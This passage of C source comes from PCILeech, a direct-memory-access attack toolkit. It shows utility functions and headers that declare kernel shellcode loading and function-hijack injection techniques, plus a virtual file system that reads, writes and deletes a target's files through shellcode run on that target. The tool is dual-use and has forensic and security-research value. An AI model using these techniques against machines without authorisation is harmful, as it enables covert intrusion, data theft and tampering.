VOID Util_AsciiFilter(_In_reads_(cb) PBYTE pb, _In_ DWORD cb)
{
    DWORD i;
    BYTE ch;
    for(i = 0; i < cb; i++) {
        ch = pb[i];
        if(0xff & UTIL_PRINTABLE_CHARACTERS_MAP[ch]) { continue; }
        pb[i] = '?';
    }
}

VOID Util_SplitString2(_In_ LPSTR sz, _In_ CHAR chSplit, _Out_writes_(MAX_PATH) PCHAR _szBuf, _Out_ LPSTR *psz1, _Out_ LPSTR *psz2)
{
    DWORD i;
    strcpy_s(_szBuf, MAX_PATH, sz);
    *psz1 = _szBuf;
    for(i = 0; i < MAX_PATH; i++) {
        if('\0' == _szBuf[i]) {
            *psz2 = _szBuf + i;
            return;
        }
        if(chSplit == _szBuf[i]) {
            _szBuf[i] = '\0';
            *psz2 = _szBuf + i + 1;
            return;
        }
    }
}

VOID Util_GetPathExe(_Out_writes_(MAX_PATH) PCHAR szPath)
{
    SIZE_T i;
    ZeroMemory(szPath, MAX_PATH);
#ifdef _WIN32
    GetModuleFileNameA(NULL, szPath, MAX_PATH - 4);
#endif /* _WIN32 */
#ifdef LINUX
    i = readlink("/proc/self/exe", szPath, MAX_PATH - 4);
    if(i == (SIZE_T)-1) { return; }
#endif /* LINUX */
    for(i = strlen(szPath) - 1; i > 0; i--) {
        if(szPath[i] == '/' || szPath[i] == '\\') {
            szPath[i + 1] = '\0';
            return;
        }
    }
}

```

`pcileech/util.h`:

```h
// util.h : definitions of various utility functions.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __UTIL_H__
#define __UTIL_H__
#include "pcileech.h"
#include "oscompatibility.h"
#include "statistics.h"

/*
* Retrieve a page table entry (PTE). (4kB pages only).
* -- qwCR3 = the contents of the CPU register CR3 (= physical address of PML4)
* -- qwAddressLinear = the virtual address for which the PTE should be retrieved
* -- pqwPTE = ptr to receive the PTE
* -- pqwPTEAddrPhysOpt = ptr to receive the physical address of the PTE
* -- return
*/
BOOL Util_PageTable_ReadPTE( _In_ QWORD qwCR3, _In_ QWORD qwAddressLinear, _Out_ PQWORD pqwPTE, _Out_ PQWORD pqwPTEAddrPhys);

/*
* Change the mode of the mapped address to executable.
* -- qwCR3
* -- qwAddressLinear
* -- return
*/
BOOL Util_PageTable_SetModeX(_In_ QWORD qwCR3, _In_ QWORD qwAddressLinear);

/*
* Find a module base given a page signature. Please note that this is a best
* effort search. Multiple modules may have the same signature or parts of the
* paging structures may be outside the 32-bit addressing scope >4GiB.
* -- pqwCR3 = the contents of the CPU register CR3 (= physical address of PML4) (may be zero on entry if page table base should be searched as well)
* -- pPTEs = paging signature of the module to find
* -- cPTEs = number of entries in pPTEs
* -- pqwSignatureBase = ptr to receive the module base
* -- return
*/
_Success_(return)
BOOL Util_PageTable_FindSignatureBase(_Inout_ PQWORD pqwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase);

/*
* Search the page tables for a given physical address. The first occurrence for
* this address will be returned.
* -- qwCR3 = the physical address of PML4.
* -- qwAddrPhys = the physical address to search for.
* -- pqwAddrVirt = ptr to receive virtual address.
* -- pqwPTE = ptr to optionally receive value of PTE
* -- pqwPDE = ptr to optionally receive value of PDE
* -- pqwPDPTE = ptr to optionally receive value of PDPTE
* -- pqwPML4E = ptr to optionally receive value of PML4E
* -- return
*/
_Success_(return)
BOOL Util_PageTable_FindMappedAddress(_In_ QWORD qwCR3, _In_ QWORD qwAddrPhys, _Out_ PQWORD pqwAddrVirt, _Out_opt_ PQWORD pqwPTE, _Out_opt_ PQWORD pqwPDE, _Out_opt_ PQWORD pqwPDPTE, _Out_opt_ PQWORD pqwPML4E);

/*
* Walk the page table to translate a virtual address into a physical.
* -- qwCR3 = the physical address of PML4.
* -- qwVA = the virtual address.
* -- pqwPA = ptr to receive physical address.
* -- pqwPageBase = ptr to receive the page base of the physical address.
* -- pqwPageSize = ptr to receive size of physical page in bytes.
* -- return
*/
_Success_(return)
BOOL Util_PageTable_Virtual2Physical(_In_ QWORD qwCR3, _In_ QWORD qwVA, _Out_ PQWORD pqwPA, _Out_ PQWORD pqwPageBase, _Out_ PQWORD pqwPageSize);

/*
* Load KMD and Unlock signatures.
* -- szSignatureName
* -- szFileExtension
* -- pSignatures = ptr to receive the signatures.
* -- cSignatures = max # of signatures referenced by pSignatures ptr.
* -- cSignatureChunks = # of chunks in signature lines to parse.
* -- return
*/
_Success_(return)
BOOL Util_LoadSignatures(_In_ LPSTR szSignatureName, _In_ LPSTR szFileExtension, _Out_ PSIGNATURE pSignatures, _Inout_ PDWORD cSignatures, _In_ DWORD cSignatureChunks);

/*
* Retrieve the full file path to the file name specified. Path is relative to
* directory of running executable.
* -- szPath = buffer to receive the full path result.
* -- szFileName = a file name in the current directory.
*/
VOID Util_GetFileInDirectory(_Out_writes_(MAX_PATH) LPSTR szPath, _In_ LPSTR szFileName);

/*
* Create a SHA256 hash
* -- pb = the data to hash
* -- cb = length of data to hash
* -- pbHash = 32 byte buffer to receive the SHA256 hash
*/
VOID Util_SHA256(_In_ PBYTE pb, _In_ DWORD cb, _Out_ __bcount(32) PBYTE pbHash);

/*
* Return the index+1 of the 1st character that differes between buffers.
* If buffers are equal 0 is returned.
*/
DWORD Util_memcmpEx(_In_ PBYTE pb1, _In_ PBYTE pb2, _In_ DWORD cb);

/*
* Simple random number function.
* -- pb = buffer to receive random data.
* -- cb = length of random data to create.
*/
VOID Util_GenRandom(_Out_ PBYTE pb, _In_ DWORD cb);

/*
* Load a kernel shellcode file (used in conjunction with the execshellcode cmd.
* NB! verification of the shellcode file is a bit lax - code execution within
* pcileech is probably possible - but is not considered an issue.
* -- szKmdExecName = name of module to load without file name suffix.
* -- pKmdExec = function will allocate and return a valid ptr to KMDEXEC struct
*    on success. Caller is responsible to call LocalFree.
* -- return
*/
_Success_(return)
BOOL Util_LoadKmdExecShellcode(_In_ LPSTR szKmdExecName, _Out_ PKMDEXEC* ppKmdExec);

/*
* Retrieve the file size of the file. If the file isn't found 0 is returned.
* -- sz = file to retrieve size of.
* -- return = file size, or 0 on fail.
*/
DWORD Util_GetFileSize(_In_ LPSTR sz);

/*
* Parse an input line consisting of either builtin, hexascii or file name to
* data buffer.
*/
_Success_(return)
BOOL Util_ParseHexFileBuiltin(_In_ LPSTR sz, _Out_writes_(*pcb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb);

/*
* Parse a string returning the QWORD representing the string. The string may
* consist of a decimal or hexadecimal integer string. Hexadecimals must begin
* with 0x.
* -- sz
* -- return
*/
QWORD Util_GetNumeric(_In_ LPSTR sz);

/*
* "Create" a static signature for Linux given the supplied parameters. The
* function formats the paramerters and put them into the supplied pSignature.
* This will only work for kernels prior to 4.8.
* -- paBase = memory physical offset to paSzKallsyms
* -- paSzKallsyms = physical offset (from base) to 'kallsyms_lookup_name' text string.
* -- vaSzKallsyms = virtual address of 'kallsyms_lookup_name' text string.
* -- vaFnKallsyms = virtual address of 'kallsyms_lookup_name' function.
* -- paSzFnHijack = physical offset (from base) to 'function to hijack' text string.
* -- vaSzFnHijack = virtual address text string 'of function to hijack' test string.
* -- vaFnHijack = virtual address of function to hijack.
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureLinuxGeneric(_In_ QWORD paBase,
    _In_ DWORD paSzKallsyms, _In_ QWORD vaSzKallsyms, _In_ QWORD vaFnKallsyms,
    _In_ DWORD paSzFnHijack, _In_ QWORD vaSzFnHijack, _In_ QWORD vaFnHijack, _Out_ PSIGNATURE pSignature);
/*
* "Create" a static signature for FreeBSD given the supplied parameters. The
* function formats the paramerters and put them into the supplied pSignature.
* -- paStrTab = physical address of the strtab found.
* -- paFnHijack = physical address of the function to hijack.
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureFreeBSDGeneric(_In_ DWORD paStrTab, _In_ DWORD paFnHijack, _Out_ PSIGNATURE pSignature);

/*
* "Create" a static signature for MacOS given the supplied parameters. The
* function formats the paramerters and put them into the supplied pSignature.
* -- paKernelBase = memory physical address of kernel macho-o header.
* -- paFunctionHook = memory physical address of the hook function.
* -- paStage2 = memory physical address where to place the stage2 shellcode.
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureMacOSGeneric(_In_ DWORD paKernelBase, _In_ DWORD paFunctionHook, _In_ DWORD paStage2, _Out_ PSIGNATURE pSignature);


/*
* Load the stage2 and stage3 code for the Hal.dll injection technique into
* the supplied signature.
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureWindowsHalGeneric(_Out_ PSIGNATURE pSignature);

/*
* Load the stage2 and stage3 code for the EFI Runtime Sertives hijack technique
* into the supplied signature.
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureLinuxEfiRuntimeServices(_Out_ PSIGNATURE pSignature);

/*
* Create a search signature that searches all memory for the signature given in
* the supplied pb and cb parameters.
* -- pb = signature.
* -- cb
* -- pSignature = ptr to signature struct to place the result in.
*/
VOID Util_CreateSignatureSearchAll(_In_ PBYTE pb, _In_ DWORD cb, _Out_ PSIGNATURE pSignature);

/*
* Read a 16MB data chunk from the target and place it in the pbBuffer16M buffer.
* Any data that failed to read within the 16MB buffer is set to zero.
* -- pbBuffer16M = the already allocated 16MB buffer to place the content in.
* -- qwBaseAddress = the base address to start reading from.
* -- pPageStat = statistics struct to update on progress (pages success/fail).
* -- return = TRUE if at least one 4k page could be read; FALSE if all pages failed.
*/
_Success_(return)
BOOL Util_Read16M(_Out_writes_(0x01000000) PBYTE pbBuffer16M, _In_ QWORD qwBaseAddress, _In_opt_ PPAGE_STATISTICS pPageStat);

/*
* Wait for the connected PCILeech device to be power cycled. This function will
* sleep until a power cycle event is detected on the connected PCILeech device.
* The connected device needs to first be powered down and then powered up before
* this function will exit.
*/
VOID Util_WaitForPowerCycle();

/*
* Wait for a PCILeech device to be powered on and for it to complete a dummy
* memory read. The pDeviceData will be initialized upon success - in which
* the function will exit.
*/
VOID Util_WaitForPowerOn();

/*
* Print a maximum of 8192 bytes of binary data as hexascii on the screen.
* -- pb
* -- cb
* -- cbInitialOffset = offset, must be max 0x1000 and multiple of 0x10.
*/
VOID Util_PrintHexAscii(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbInitialOffset);

/*
* Filter away (replace with '?') potentially harmful characters from an ascii
* string / text.
* -- pb
* -- cb
*/
VOID Util_AsciiFilter(_In_reads_(cb) PBYTE pb, _In_ DWORD cb);

/*
* Split a string into two at the first 'chSplit' character. If no 2nd string
* is found then it's returned as null character '\0' (i.e. not as NULL).
* -- sz = the original string to split (of maximum MAX_PATH length)
* -- chSplit = the delimiter character to split on.
* -- _szBuf = MAX_PATH sized buffer that will be overwritten and used throughout the lifetime of psz1/psz2 outputs.
* -- psz1
* -- psz2
*/
VOID Util_SplitString2(_In_ LPSTR sz, _In_ CHAR chSplit, _Out_writes_(MAX_PATH) PCHAR _szBuf, _Out_ LPSTR *psz1, _Out_ LPSTR *psz2);

/*
* Return the path of the executable (not including the executable).
* -- szPath
*/
VOID Util_GetPathExe(_Out_writes_(MAX_PATH) PCHAR szPath);

#endif /* __UTIL_H__ */

```

`pcileech/version.h`:

```h
#define STRINGIZE2(s) #s
#define STRINGIZE(s) STRINGIZE2(s)

#define VERSION_MAJOR               4
#define VERSION_MINOR               14
#define VERSION_REVISION            0
#define VERSION_BUILD               31

#define VER_FILE_DESCRIPTION_STR    "The PCILeech Direct Memory Access Attack Toolkit"
#define VER_FILE_VERSION            VERSION_MAJOR, VERSION_MINOR, VERSION_REVISION, VERSION_BUILD
#define VER_FILE_VERSION_STR        STRINGIZE(VERSION_MAJOR)        \
                                    "." STRINGIZE(VERSION_MINOR)    \
                                    "." STRINGIZE(VERSION_REVISION) \
                                    "." STRINGIZE(VERSION_BUILD)    \

#define VER_COMPANY_NAME_STR        ""
#define VER_PRODUCTNAME_STR         "PCILeech"
#define VER_PRODUCT_VERSION         VER_FILE_VERSION
#define VER_PRODUCT_VERSION_STR     VER_FILE_VERSION_STR
#define VER_ORIGINAL_FILENAME_STR   VER_PRODUCTNAME_STR ".exe"
#define VER_INTERNAL_NAME_STR       VER_ORIGINAL_FILENAME_STR
#define VER_COPYRIGHT_STR           "Copyright (c) Ulf Frisk 2016-2020"

```

`pcileech/vfs.c`:

```c
// vfs.c : implementation of functions related to virtual file system support.
//
// (c) Ulf Frisk, 2017-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "vfs.h"
#include "vfslist.h"
#include "device.h"
#include "executor.h"
#include "charutil.h"
#include "util.h"
#include <vmmdll.h>

#ifdef WIN32
#pragma warning( push )  
#pragma warning( disable : 4005 )   
#include <dokan.h>
#pragma warning( pop )
#endif /* WIN32 */
#ifdef LINUX
#define FUSE_USE_VERSION 30
#include <fuse.h>
#include "oscompatibility.h"
#endif /* LINUX */



//-------------------------------------------------------------------------------
// Defines and Typedefs (shared with shellcode) below:
//-------------------------------------------------------------------------------

#define VFS_OP_MAGIC                    0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY       1
#define VFS_OP_CMD_WRITE                2
#define VFS_OP_CMD_READ                 3
#define VFS_OP_CMD_CREATE               4
#define VFS_OP_CMD_DELETE               5
#define VFS_OP_CMD_LIST_DRIVES          6

typedef struct tdVFS_OPERATION {
    QWORD magic;
    QWORD op;
    QWORD flags;
    CHAR szFileName[MAX_PATH];
    WCHAR wszFileName[MAX_PATH];
    QWORD offset;
    QWORD cb;
    BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_GLOBAL_STATE {
    QWORD cbKmd;
    QWORD cbNative;
    CRITICAL_SECTION Lock;
    QWORD PCILeechOperatingSystem;
    CHAR szNameVfsShellcode[32];
    // dokan only below:
    FILETIME ftDefaultTime;
    NTSTATUS(*DokanNtStatusFromWin32)(DWORD Error);
} VFS_GLOBAL_STATE, *PVFS_GLOBAL_STATE;

static PVFS_GLOBAL_STATE g_vfs = NULL;

/*
* Helper function to initialize a file operation
* -- pop
* -- qwOperation = VFS_OP_CMD_*
* -- uszPath = full path incl. file name starting with '\files\'
* -- return
*/
_Success_(return)
BOOL VfsInitOperation(_Out_ PVFS_OPERATION pop, _In_ QWORD qwOperation, _In_ LPSTR uszPath)
{
    ZeroMemory(pop, sizeof(VFS_OPERATION));
    pop->magic = VFS_OP_MAGIC;
    pop->op = qwOperation;
    if(g_vfs->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_WINDOWS) {
        if(uszPath[0] == '\\' && ((uszPath[1] >= 'a' && uszPath[1] <= 'z') || (uszPath[1] >= 'A' && uszPath[1] <= 'Z'))) {
            CharUtil_UtoW("\\??\\C:\\", -1, (PBYTE)pop->wszFileName, sizeof(pop->wszFileName), NULL, NULL, CHARUTIL_FLAG_STR_BUFONLY);
            pop->wszFileName[4] = uszPath[1];
            if(uszPath[2] == '\\') {
                CharUtil_UtoW(uszPath + 3, -1, (PBYTE)pop->wszFileName + 14, sizeof(pop->wszFileName) - 16, NULL, NULL, CHARUTIL_FLAG_STR_BUFONLY | CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR);
            }
            pop->flags = VFS_FLAGS_UNICODE;
            return TRUE;
        }
    } else {
        CharUtil_UtoU(uszPath, -1, (PBYTE)pop->szFileName, (DWORD)sizeof(pop->szFileName), NULL, NULL, CHARUTIL_FLAG_STR_BUFONLY | CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR);
        CharUtil_ReplaceAllA(pop->szFileName, '\\', '/');
        return TRUE;
    }
    return FALSE;
}

VOID VfsListDirectory(_In_ LPSTR uszPath, _Inout_ PVMMDLL_VFS_FILELIST2 pFileList)
{
    BOOL fResult;
    VFS_OPERATION op = { 0 };
    PVFS_RESULT_FILEINFO pe, pfi = NULL;
    PBYTE pbAllDrive = NULL;
    CHAR szDrive[] = { '-' , 0 };
    QWORD i, cfi, cbfi, cbAllDrive = 0;
    VMMDLL_VFS_FILELIST_EXINFO eExInfo = { 0 };
    LPSTR uszResult;
    BYTE pbBuffer[3 * MAX_PATH];
    // sanity check:
    if(_strnicmp(uszPath, "\\files", 6)) { return; }
    uszPath += 6;
    // initialize vfs operation:
    if((g_vfs->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_WINDOWS) && (!uszPath[0] || !uszPath[1])) {
        // list windows target drive letters:
        VfsInitOperation(&op, VFS_OP_CMD_LIST_DRIVES, "");
        EnterCriticalSection(&g_vfs->Lock);
        fResult = Exec_ExecSilent(g_vfs->szNameVfsShellcode, (PBYTE)&op, sizeof(VFS_OPERATION), &pbAllDrive, &cbAllDrive);
        LeaveCriticalSection(&g_vfs->Lock);
        if(fResult && pbAllDrive && (cbAllDrive == 26)) {
            for(i = 0; i < cbAllDrive; i++) {
                szDrive[0] = pbAllDrive[i];
                if((szDrive[0] >= 'a') && (szDrive[0] <= 'z')) {
                    pFileList->pfnAddDirectory(pFileList->h, szDrive, NULL);
                }
            }
        }
        LocalFree(pbAllDrive);
        return;
    }
    VfsInitOperation(&op, VFS_OP_CMD_LIST_DIRECTORY, uszPath);
    // perform operation:
    EnterCriticalSection(&g_vfs->Lock);
    fResult = Exec_ExecSilent(g_vfs->szNameVfsShellcode, (PBYTE)&op, sizeof(VFS_OPERATION), (PBYTE*)&pfi, &cbfi);
    LeaveCriticalSection(&g_vfs->Lock);
    if(!fResult) { return; }
    // interprete result:
    eExInfo.dwVersion = VMMDLL_VFS_FILELIST_EXINFO_VERSION;
    cfi = cbfi / sizeof(VFS_RESULT_FILEINFO);
    for(i = 0; i < cfi; i++) {
        pe = pfi + i;
        if(CharUtil_WtoU(pe->wszFileName, -1, pbBuffer, sizeof(pbBuffer), &uszResult, NULL, 0)) {
            eExInfo.qwCreationTime = pfi->tCreateOpt;
            eExInfo.qwLastAccessTime = pfi->tAccessOpt;
            eExInfo.qwLastWriteTime = pfi->tModifyOpt;
            if(pe->flags & VFS_FLAGS_FILE_DIRECTORY) {
                pFileList->pfnAddDirectory(pFileList->h, uszResult, &eExInfo);
            } else {
                pFileList->pfnAddFile(pFileList->h, uszResult, pe->cb, &eExInfo);
            }
        }
    }
    LocalFree(pfi);
}

BOOL VfsListU(_In_ LPSTR uszPath, _Inout_ PVMMDLL_VFS_FILELIST2 pFileList)
{
    // root directory:
    if(!strcmp(uszPath, "\\")) {
        if(g_vfs->cbNative) {
            pFileList->pfnAddFile(pFileList->h, "liveram-native.raw", g_vfs->cbNative, NULL);
        }
        if(g_vfs->cbKmd) {
            pFileList->pfnAddFile(pFileList->h, "liveram-kmd.raw", g_vfs->cbKmd, NULL);
            pFileList->pfnAddDirectory(pFileList->h, "files", NULL);
        }
    }
    // files directory:
    if(!_strnicmp(uszPath, "\\files", 6) && g_vfs->cbKmd) {
        VfsListDirectory(uszPath, pFileList);
    }
    return TRUE;
}

BOOL VfsIsBlackList(_In_ LPSTR uszPathFull)
{
    if(g_vfs->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
        return !strncmp(uszPathFull, "\\dev\\watchdog", 13);
    }
    return FALSE;
}

NTSTATUS VfsReadFile(_In_ LPSTR uszPathFull, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ QWORD cbOffset)
{
    BOOL result;
    VFS_OPERATION op;
    PBYTE pbBufferDma = NULL;
    QWORD cbBufferDma;
    QWORD qwBaseOffset, qwBase, qwSize;
    if(VfsIsBlackList(uszPathFull)) { return STATUS_ACCESS_DENIED; }
    *pcbRead = cb;
    result = VfsInitOperation(&op, VFS_OP_CMD_READ, uszPathFull);
    if(!result) { return STATUS_DATA_ERROR; }
    qwBaseOffset = cbOffset % 0x00100000; // 1MB
    qwBase = cbOffset - qwBaseOffset;
    qwSize = (cb + qwBaseOffset + 0x1fffff) & ~0x1fffff;
    op.offset = qwBase;
    op.cb = qwSize;
    EnterCriticalSection(&g_vfs->Lock);
    // TODO OP FIXES!
    result = Exec_ExecSilent(g_vfs->szNameVfsShellcode, (PBYTE)&op, sizeof(VFS_OPERATION), &pbBufferDma, &cbBufferDma);
    LeaveCriticalSection(&g_vfs->Lock);
    if(result && (qwBaseOffset <= cbBufferDma)) {
        *pcbRead = (DWORD)min(*pcbRead, cbBufferDma - qwBaseOffset);
        memcpy(pb, pbBufferDma + qwBaseOffset, *pcbRead);
        LocalFree(pbBufferDma);
        return STATUS_SUCCESS;
    }
    return STATUS_DATA_ERROR;
}

NTSTATUS VfsReadMemory(_In_ BOOL fKMD, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ QWORD cbOffset)
{
    BOOL result = FALSE;
    QWORD cbRead2, cbMaxMemorySize, qwCfgAddrMaxOrig;
    cbMaxMemorySize = fKMD ? g_vfs->cbKmd : g_vfs->cbNative;
    if(cbOffset >= cbMaxMemorySize) {
        *pcbRead = 0;
        return STATUS_FILE_INVALID;
    }
    *pcbRead = (DWORD)min(cb, cbMaxMemorySize - cbOffset);
    if(fKMD) {
        qwCfgAddrMaxOrig = ctxMain->cfg.paAddrMax;    // TODO: REMOVE UGLY HACK WITH ADDRMAX...
        EnterCriticalSection(&g_vfs->Lock);
        if(!DeviceReadMEM(cbOffset, *pcbRead, pb, TRUE)) {
            ZeroMemory(pb, *pcbRead);
        }
        LeaveCriticalSection(&g_vfs->Lock);
        ctxMain->cfg.paAddrMax = qwCfgAddrMaxOrig;
    } else {
        cbRead2 = DeviceReadDMA(cbOffset, *pcbRead, pb, NULL);
        if(cbRead2 < *pcbRead) {
            ZeroMemory(pb + cbRead2, *pcbRead - cbRead2);
        }
    }
    return STATUS_SUCCESS;
}

NTSTATUS VfsRead(_In_ LPSTR uszPathFull, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ QWORD cbOffset)
{
    if(!_stricmp(uszPathFull, "\\liveram-kmd.raw") && g_vfs->cbKmd) { // kernel module backed RAM file
        return VfsReadMemory(TRUE, pb, cb, pcbRead, cbOffset);
    }
    if(!_stricmp(uszPathFull, "\\liveram-native.raw") && g_vfs->cbNative) { // native backed RAM file
        return VfsReadMemory(FALSE, pb, cb, pcbRead, cbOffset);
    }
    if(!_strnicmp(uszPathFull, "\\files\\", 7) && g_vfs->cbKmd) {
        return VfsReadFile(uszPathFull + 6, pb, cb, pcbRead, cbOffset);
    }
    return STATUS_FILE_INVALID;
}

NTSTATUS VfsWriteFile(_In_ BOOL fAppend, _In_ LPSTR uszPathFull, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ QWORD cbOffset)
{
    PVFS_OPERATION pop = NULL;
    if(VfsIsBlackList(uszPathFull)) { return STATUS_ACCESS_DENIED; }
    pop = (PVFS_OPERATION)LocalAlloc(LMEM_ZEROINIT, sizeof(VFS_OPERATION) + cb);
    if(!pop) { return STATUS_MEMORY_NOT_ALLOCATED; }
    if(!VfsInitOperation(pop, VFS_OP_CMD_WRITE, uszPathFull)) { return STATUS_DATA_ERROR; }
    if(fAppend) {
        pop->flags |= VFS_FLAGS_APPEND_ON_WRITE;
    }
    if(0 == cbOffset) {
        // TODO: find when to truncate and when not to... if 0th byte is written file is truncated now...
        pop->flags |= VFS_FLAGS_TRUNCATE_ON_WRITE;
    }
    memcpy(pop->pb, pb, cb);
    pop->offset = cbOffset;
    pop->cb = cb;
    EnterCriticalSection(&g_vfs->Lock);
    Exec_ExecSilent(g_vfs->szNameVfsShellcode, (PBYTE)pop, sizeof(VFS_OPERATION) + cb, NULL, NULL);
    LeaveCriticalSection(&g_vfs->Lock);
    VfsList_Clear(uszPathFull);
    *pcbWrite = cb;
    LocalFree(pop);
    return STATUS_SUCCESS;
}

NTSTATUS VfsWriteMemory(_In_ BOOL fKMD, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset)
{
    BOOL result;
    if(fKMD) {  // kernel module backed RAM file
        EnterCriticalSection(&g_vfs->Lock);
        result = DeviceWriteMEM(cbOffset, cb, pb, TRUE);
        LeaveCriticalSection(&g_vfs->Lock);
    } else {    // native DMA backed RAM file
        result = LcWrite(ctxMain->hLC, cbOffset, cb, pb);
    }
    *pcbWrite = cb;
    return result ? STATUS_SUCCESS : STATUS_FILE_SYSTEM_LIMITATION;
}

NTSTATUS VfsWrite(_In_ BOOL fAppend, _In_ LPSTR uszPathFull, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset)
{
    if(!_stricmp(uszPathFull, "\\liveram-kmd.raw") && g_vfs->cbKmd) { // kernel module backed RAM file
        return VfsWriteMemory(TRUE, pb, cb, pcbWrite, cbOffset);
    }
    if(!_stricmp(uszPathFull, "\\liveram-native.raw") && g_vfs->cbNative) { // native backed RAM file
        return VfsWriteMemory(FALSE, pb, cb, pcbWrite, cbOffset);
    }
    if(!_strnicmp(uszPathFull, "\\files\\", 7) && g_vfs->cbKmd) {
        return VfsWriteFile(fAppend, uszPathFull + 6, pb, cb, pcbWrite, cbOffset);
    }
    return STATUS_FILE_INVALID;
}

VOID VfsDelete(_In_ LPSTR uszPathFull)
{
    VFS_OPERATION op;
    if(!_strnicmp(uszPathFull, "\\files\\", 7)) {
        if(!VfsInitOperation(&op, VFS_OP_CMD_DELETE, uszPathFull + 6)) { return; }
        EnterCriticalSection(&g_vfs->Lock);
        Exec_ExecSilent(g_vfs->szNameVfsShellcode, (PBYTE)&op, sizeof(VFS_OPERATION), NULL, NULL);
        LeaveCriticalSection(&g_vfs->Lock);
        VfsList_Clear(uszPathFull);
    }
}



#ifdef _WIN32

//-------------------------------------------------------------------------------
// WINDOWS-ONLY functions including DOKAN CALLBACK functions.
//-------------------------------------------------------------------------------

NTSTATUS
VfsDokanCallback_CreateFile_Impl(_In_ LPSTR uszFullPath, PDOKAN_IO_SECURITY_CONTEXT SecurityContext, ACCESS_MASK DesiredAccess, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PDOKAN_FILE_INFO DokanFileInfo)
{
    VFS_ENTRY VfsEntry;
    CHAR uszPath[MAX_PATH];
    LPSTR uszFile;
    BOOL fIsDirectoryExisting = FALSE;
    UNREFERENCED_PARAMETER(SecurityContext);
    UNREFERENCED_PARAMETER(FileAttributes);
    // root directory
    if(!strcmp(uszFullPath, "\\")) {
        if(CreateDisposition == CREATE_ALWAYS) { return g_vfs->DokanNtStatusFromWin32(ERROR_ACCESS_DENIED); }
        DokanFileInfo->IsDirectory = TRUE;
        return STATUS_SUCCESS;
    }
    // other files
    if(CreateDisposition == CREATE_ALWAYS) { return g_vfs->DokanNtStatusFromWin32(ERROR_ACCESS_DENIED); }
    uszFile = CharUtil_PathSplitLastEx(uszFullPath, uszPath, sizeof(uszPath));
    if(!VfsList_GetSingle(uszPath[0] ? uszPath : "\\", uszFile, &VfsEntry, &fIsDirectoryExisting)) {
        return fIsDirectoryExisting ? STATUS_OBJECT_NAME_NOT_FOUND : STATUS_OBJECT_PATH_NOT_FOUND;
    }
    DokanFileInfo->Nocache = TRUE;
    if(!DokanFileInfo->IsDirectory && (CreateOptions & FILE_DIRECTORY_FILE)) { return STATUS_NOT_A_DIRECTORY; }     // fail upon open normal file as directory
    return (CreateDisposition == OPEN_ALWAYS) ? STATUS_OBJECT_NAME_COLLISION : STATUS_SUCCESS;
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_CreateFile(LPCWSTR FileName, PDOKAN_IO_SECURITY_CONTEXT SecurityContext, ACCESS_MASK DesiredAccess, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)FileName, -1, pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return STATUS_OBJECT_NAME_NOT_FOUND; }
    return VfsDokanCallback_CreateFile_Impl(uszPathFull, SecurityContext, DesiredAccess, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, DokanFileInfo);
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_GetFileInformation_Impl(_In_ LPSTR uszFullPath, _Inout_ LPBY_HANDLE_FILE_INFORMATION hfi, _In_ PDOKAN_FILE_INFO DokanFileInfo)
{
    VFS_ENTRY VfsEntry;
    CHAR uszPath[MAX_PATH];
    LPSTR uszFile;
    BOOL fIsDirectoryExisting = FALSE;
    // matches: root directory
    if(!strcmp(uszFullPath, "\\")) {
        hfi->ftCreationTime = g_vfs->ftDefaultTime;
        hfi->ftLastWriteTime = g_vfs->ftDefaultTime;
        hfi->ftLastAccessTime = g_vfs->ftDefaultTime;
        hfi->nFileSizeHigh = 0;
        hfi->nFileSizeLow = 0;
        hfi->dwFileAttributes = FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED;
        return STATUS_SUCCESS;
    }
    uszFile = CharUtil_PathSplitLastEx(uszFullPath, uszPath, sizeof(uszPath));

    if(!VfsList_GetSingle((uszPath[0] ? uszPath : "\\"), uszFile, &VfsEntry, &fIsDirectoryExisting)) {
        return STATUS_FILE_NOT_AVAILABLE;
    }
    hfi->dwFileAttributes = VfsEntry.dwFileAttributes;
    hfi->ftCreationTime = VfsEntry.ftCreationTime;
    hfi->ftLastAccessTime = VfsEntry.ftLastAccessTime;
